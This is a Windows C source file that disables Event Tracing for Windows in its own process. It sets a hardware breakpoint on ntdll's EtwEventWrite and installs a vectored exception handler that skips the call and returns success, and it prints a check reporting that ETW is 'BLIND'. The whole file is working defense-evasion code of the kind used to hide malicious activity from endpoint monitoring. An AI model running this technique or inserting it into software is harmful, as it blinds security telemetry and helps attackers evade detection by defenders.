#include <windows.h>
// #include <evntprov.h> // if you include this you don't need to have that etw.h
#include "etw.h"
#include <stdio.h>

typedef ULONG (WINAPI* ETWEVENTWRITE) ( REGHANDLE RegHandle,EVENT_DESCRIPTOR const *EventDescriptor, ULONG UserDataCount, EVENT_DATA_DESCRIPTOR *UserData);

static ETWEVENTWRITE pEtwEventWrite = NULL;

LONG WINAPI VectoredExceptionHandler( PEXCEPTION_POINTERS pExecptionInfo )
{
    if ( pExecptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP )
    {
        if ( pExecptionInfo->ExceptionRecord->ExceptionAddress == (PVOID)pEtwEventWrite)
        {
            pExecptionInfo->ContextRecord->Rip = *( DWORD64* )pExecptionInfo->ContextRecord->Rsp;
            pExecptionInfo->ContextRecord->Rsp += sizeof( PVOID );
            pExecptionInfo->ContextRecord->Rax = 0;

            pExecptionInfo->ContextRecord->Dr6 &= ~0xF;
            pExecptionInfo->ContextRecord->EFlags |= 0x10000;

            return EXCEPTION_CONTINUE_EXECUTION;
        }

        return EXCEPTION_CONTINUE_SEARCH;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

BOOL CheckETW(void) {
    ULONG status = pEtwEventWrite(0, NULL, 0, NULL);
    printf("[+] EtwEventWrite returned: 0x%08lX\n", status);
    if (status == 0) {
        printf("[+] ETW is BLIND - events are silently dropped\n");
        return TRUE;
    }
    printf("[-] ETW is still active\n");
    return FALSE;
}

BOOL SetHwBp(HANDLE hThread, PVOID pAddress, DWORD regIndex)
{
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if ( !GetThreadContext( hThread, &ctx ) )
    {
        return FALSE;
    }

    switch (regIndex)
    {
        case 0: ctx.Dr0 = ( DWORD_PTR )pAddress; break;
        case 1: ctx.Dr1 = ( DWORD_PTR )pAddress; break;
        case 2: ctx.Dr2 = ( DWORD_PTR )pAddress; break;
        case 3: ctx.Dr3 = ( DWORD_PTR )pAddress; break;
        default: return FALSE;
    }

    ctx.Dr7 |= ( 1 << ( regIndex * 2 ) );
    ctx.Dr7 &= ~( 1 << ( 16 + regIndex * 4 ) );
    ctx.Dr7 &= ~( 1 << ( 17 + regIndex * 4 ) );

    if ( !SetThreadContext( hThread, &ctx ) )
    {
        return FALSE;
    }

    return TRUE;

}


BOOL RemoveHwBp( HANDLE hThread, DWORD regIndex )
{
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if ( !GetThreadContext ( hThread, &ctx ) )
    {
        printf("GetThreadContext failed %lu \n", GetLastError() );
        return FALSE;
    }

    switch (regIndex)
    {
        case 0: ctx.Dr0 = 0; break;
        case 1: ctx.Dr1 = 0; break;
        case 2: ctx.Dr2 = 0; break;
        case 3: ctx.Dr3 = 0; break;
        default: return FALSE;
    }

    ctx.Dr7 &= ~( 1 << (regIndex * 2 ) );

    if ( !SetThreadContext( hThread, &ctx ) )
    {
        printf("SetThreadContext failed %lu \n", GetLastError() );
        return FALSE;
    }

    return TRUE;
}


int main()
{
    printf("[+] Patching ETW via Hardware Breakpoints \n");

    HANDLE hNtdll = GetModuleHandleA("ntdll.dll");
    if ( hNtdll == 0)
    {
        printf("[!] Failed to load ntdll.dll \n");
        return 0;
    }

    printf("The handle of ntdll is 0x%0p \n", hNtdll);

    pEtwEventWrite = (ETWEVENTWRITE)GetProcAddress(hNtdll, "EtwEventWrite");
    if ( pEtwEventWrite == 0)
    {
        printf("[!] Failed to get addr pEtwEventWrite \n");
        return 0;
    }

    printf("The handle of pEtwEventWrite is 0x%0p \n", pEtwEventWrite);

    AddVectoredExceptionHandler(1 , VectoredExceptionHandler);

    SetHwBp( (HANDLE)-2, (PVOID)pEtwEventWrite, 0);

    printf("[+] Breakpoint set at 0x%p \n", pEtwEventWrite);

    system("pause");

    CheckETW();

    RemoveHwBp( (HANDLE)-2, 0);

    return 0;

}